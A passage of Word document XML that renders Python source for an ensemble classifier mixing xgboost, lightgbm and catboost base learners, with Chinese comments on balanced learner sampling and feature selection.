      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        base_depth=6,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021E7CF8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        base_rounds=100,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6811DC6A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        base_pool=("xgboost", "lightgbm", "catboost"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="158058C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        base_overrides=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F4ECAC3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        class_weight="balanced",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB106C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        random_state=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F8DB0E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_jobs=-1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0551DDF5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D922729">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.n_estimators = n_estimators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115D016E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.max_depth = max_depth</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2118B84A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.max_features = max_features</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1E2C52">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.base_depth = base_depth</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9BA354">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.base_rounds = base_rounds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DCAB9BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.base_pool = base_pool</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B076A05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.base_overrides = base_overrides</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FAA9F4F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.class_weight = class_weight</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7CF5A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.random_state = random_state</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7601D357">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.n_jobs = n_jobs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E17FA97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77357D9F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ---------------------------------------------------------------- 内部工具</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177EF3E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="260BE4CD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    @staticmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5C1F29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _validate_X(X):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592B4A96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if hasattr(X, "to_numpy"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AA630D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return X.to_numpy(dtype=np.float32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F87D82F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return np.asarray(X, dtype=np.float32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079FAE2D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15806CDF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _resolve_max_features(self, n_features):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="723BF476">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        mf = self.max_features</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB86129">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if mf is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BFBA835">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return n_features</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5216A1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if isinstance(mf, str):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C29DCD5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if mf in ("sqrt", "auto"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71677189">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                return max(1, int(math.sqrt(n_features)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747CB04E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if mf == "log2":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B196A6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                return max(1, int(math.log2(n_features)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5091D05A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise ValueError(f"不支持的 max_features：{mf!r}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A41D7D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if isinstance(mf, float):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D153C2A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return max(1, min(n_features, int(mf * n_features)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216D2CAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return max(1, min(n_features, int(mf)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76716F9C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35C153E1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _draw_kinds(self, rng):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FDE71F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """随机分配基学习器种类，但保证各库数量均衡。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75667E8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="093C1FBA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        纯独立随机在 n_estimators=24 时会有不小的概率某个库一次都抽不到，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1282B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        那这一路的知识就白丢了；先按轮次铺满再打乱，随机性和覆盖性都保住。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1495CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2479D9B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        pool = list(self.base_pool)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52304554">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not pool:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60827B96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise ValueError("base_pool 不能为空")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9D625F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        reps = int(math.ceil(self.n_estimators / len(pool)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD8FA51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        kinds = pool * reps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A2713B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        order = rng.permutation(len(kinds))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4932A6ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return [kinds[i] for i in order[: self.n_estimators]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7016A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09F17B53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _sample_weight(self, y_enc):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E5496B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        cw = self.class_weight</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71303869">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if cw is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A704AA0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
